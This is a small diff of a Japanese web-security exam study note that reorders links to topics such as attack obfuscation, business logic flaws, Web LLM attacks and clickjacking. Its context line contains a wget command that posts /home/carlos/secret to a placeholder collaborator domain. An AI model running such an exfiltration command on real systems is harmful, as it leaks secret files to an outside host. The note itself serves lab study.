@@ -76,7 +76,7 @@ wget https://COLLABORATOR_DOMAIN --post-file=/home/carlos/secret
 ---
 #### Misc
 
-- ⭐️[Web攻撃の難読化](../../OSCP/Cheatsheet/AV%20Evasion/Web攻撃の難読化.md)
+- ⭐️[Web攻撃の難読化](../../OSCP/Cheatsheet/AV%20Evasion(範囲外)/Web攻撃の難読化.md)
 - [⚡️Business logic vuln](../Server-side/Business%20logic%20vuln/⚡️Business%20logic%20vuln.md): 重要な考え方のようなもの
 - Web LLM - 1/30に登場なので試験に出ない可能性大。もしAIとのchat機能があるなら[1. Web LLM attackの基本と対策](../Advanced/Web%20LLM%20attacks/1.%20Web%20LLM%20attackの基本と対策.md)
 -  [Clickjacking](../Client-side/Clickjacking.md): 優先度はかなり低い
